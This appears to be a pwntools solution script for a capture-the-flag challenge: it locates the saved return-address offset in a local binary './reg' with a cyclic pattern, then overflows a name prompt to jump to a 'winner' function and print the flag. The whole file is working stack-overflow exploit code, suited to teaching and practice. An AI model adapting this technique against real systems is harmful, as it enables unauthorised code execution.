from pwn import *


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('Enter your name :', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Set up pwntools for the correct architecture
exe = './reg'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP offset
offset = find_eip(cyclic(100))

# Start program
io = process()
# io = remote('server', 1337)

# Build the payload
payload = flat(
    {offset: elf.functions.winner}
)

# gdb.attach(io, gdbscript='''
# init-pwndbg
# ''')

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('Enter your name :', payload)
io.recvuntil('Congratulations!\n')

# Get our flag!
flag = io.recv()
success(flag)
